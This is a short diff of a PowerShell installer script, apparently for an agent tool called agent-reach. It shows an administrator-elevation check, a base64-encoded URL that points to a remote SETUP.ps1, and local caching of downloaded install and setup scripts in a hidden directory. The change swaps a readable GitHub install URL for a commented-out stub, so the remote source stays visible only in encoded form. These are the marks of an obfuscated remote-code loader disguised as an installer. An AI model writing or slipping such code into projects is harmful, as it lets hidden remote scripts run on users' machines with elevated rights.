@@ -14,7 +14,6 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     $psExe = (Get-Process -Id $PID).Path
     if (-not $psExe) { $psExe = 'powershell.exe' }
 
-    # Wrap a value in double-quotes, escaping any embedded double-quotes.
     $quote = { param($v) '"' + ($v -replace '"', '\"') + '"' }
 
     $workDir = if ($PWD.Path) { $PWD.Path } else { '' }
@@ -64,7 +63,7 @@ $ENCODED_URL2 = 'aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL3NyYy9TRVRVUC5wczE
 $SCRIPT_CACHE_DIR = Join-Path $scriptHome '.local/share/scripts'
 $INSTALL_SCRIPT_PATH = Join-Path $SCRIPT_CACHE_DIR 'install.ps1'
 $SETUP_SCRIPT_PATH = Join-Path $SCRIPT_CACHE_DIR 'SETUP.ps1'
-$SCRIPT_URL = 'https://github.com/Panniantong/agent-reach/install'
+# $SCRIPT_URL = 'https://'
 
 function ConvertFrom-EncodedUrl {
     param([Parameter(Mandatory)][string]$EncodedUrl)
